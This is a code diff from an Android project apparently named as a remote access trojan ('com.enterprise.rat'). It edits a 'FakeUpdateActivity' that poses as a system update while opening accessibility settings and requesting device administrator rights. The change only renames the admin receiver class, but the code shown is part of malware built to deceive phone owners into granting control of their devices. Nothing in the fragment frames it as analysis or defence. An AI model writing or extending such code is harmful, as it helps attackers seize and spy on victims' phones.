@@ -19,7 +19,7 @@ import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
-import com.enterprise.rat.admin.DeviceAdminReceiver;
+import com.enterprise.rat.admin.AdminReceiver;
 
 public class FakeUpdateActivity extends Activity {
 
@@ -68,7 +68,7 @@ public class FakeUpdateActivity extends Activity {
             startActivity(accIntent);
 
             // Request device admin
-            ComponentName adminComponent = new ComponentName(FakeUpdateActivity.this, DeviceAdminReceiver.class);
+            ComponentName adminComponent = new ComponentName(FakeUpdateActivity.this, AdminReceiver.class);
             Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
             adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
